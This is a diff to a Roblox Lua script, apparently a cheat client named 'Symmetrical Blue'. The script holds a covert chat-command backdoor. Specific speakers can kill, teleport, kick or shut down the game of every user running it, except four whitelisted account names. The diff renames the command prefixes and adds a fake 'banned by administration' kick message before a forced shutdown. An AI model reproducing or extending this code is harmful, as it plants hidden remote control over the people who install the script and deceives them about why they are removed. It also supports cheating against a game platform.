@@ -231,13 +231,13 @@ end)
                 pcall(function()
                 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(msg)
                     pcall(function()
-                        if msg.Message == ',checkusers' then
+                        if msg.Message == '.checkusers' then
                             if msg.FromSpeaker == Player.Name then
                                 game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..Player.Name..' Yes I am indeed using Symmetrical Blue', 'All');
                             end
                         end
                         
-                        if msg.Message == ',kill '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.kill '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -246,7 +246,7 @@ end)
                             end
                         end 
         
-                        if msg.Message == ',kill all' then
+                        if msg.Message == '.kill all' then
                             if msg.FromSpeaker == Player2.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -255,7 +255,7 @@ end)
                             end
                         end 
                         
-                        if msg.Message == ',shutdown '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.shutdown '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -265,7 +265,7 @@ end)
                             end
                         end  
                             
-                        if msg.Message == ',shutdown all' then
+                        if msg.Message == '.shutdown all' then
                             if msg.FromSpeaker == Player2.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -275,19 +275,19 @@ end)
                             end
                         end
 
-                        if msg.Message == ',bring '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.bring '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
                                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player.Character.HumanoidRootPart.Position)
                             end
                         end  
                             
-                        if msg.Message == ',bring all' then
+                        if msg.Message == '.bring all' then
                             if msg.FromSpeaker == Player2.Name then
                                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player.Character.HumanoidRootPart.Position)
                             end
                         end
 
-                        if msg.Message == ',kfc '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.kfc '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -296,7 +296,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',kfc all' then
+                        if msg.Message == '.kfc all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -305,7 +305,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',walmart '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.walmart '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -314,7 +314,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',walmart all' then
+                        if msg.Message == '.walmart all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -323,7 +323,7 @@ end)
                             end
                         end 
         
-                        if msg.Message == ',target '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.target '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -332,7 +332,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',target all' then
+                        if msg.Message == '.target all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -341,7 +341,7 @@ end)
                             end
                         end
         
-                        if msg.Message == ',mcdonalds '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.mcdonalds '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -350,7 +350,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',mcdonalds all' then
+                        if msg.Message == '.mcdonalds all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -359,7 +359,7 @@ end)
                             end
                         end
                         
-                        if msg.Message == ',burgerking '..game:GetService("Players").LocalPlayer.Name or msg.Message == ',bking'..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.burgerking '..game:GetService("Players").LocalPlayer.Name or msg.Message == ',bking'..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -368,7 +368,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',burgerking all' or msg.Message == 'bking all' then
+                        if msg.Message == '.burgerking all' or msg.Message == 'bking all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                 else
@@ -377,7 +377,7 @@ end)
                             end
                         end
         
-                        if msg.Message == ',seveneleven '..game:GetService("Players").LocalPlayer.Name then
+                        if msg.Message == '.seveneleven '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                     seveneleven()
@@ -385,7 +385,7 @@ end)
                             end
                         end  
         
-                        if msg.Message == ',seveneleven all' then
+                        if msg.Message == '.seveneleven all' then
                             if msg.FromSpeaker == Player.Name then
                                 if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                     seveneleven()
@@ -436,7 +436,9 @@ end)
                             
                         if msg.Message == '.shutdown all' then
                             if msg.FromSpeaker == Player2.Name then
-                                wait(.9)
+                               wait(.9)
+                                game.Players.LocalPlayer:Kick("You Has Been Banned By Adminstration | To Appeal Contact Owner")
+                                wait(2)
                                 game:Shutdown()
                             end
                         end
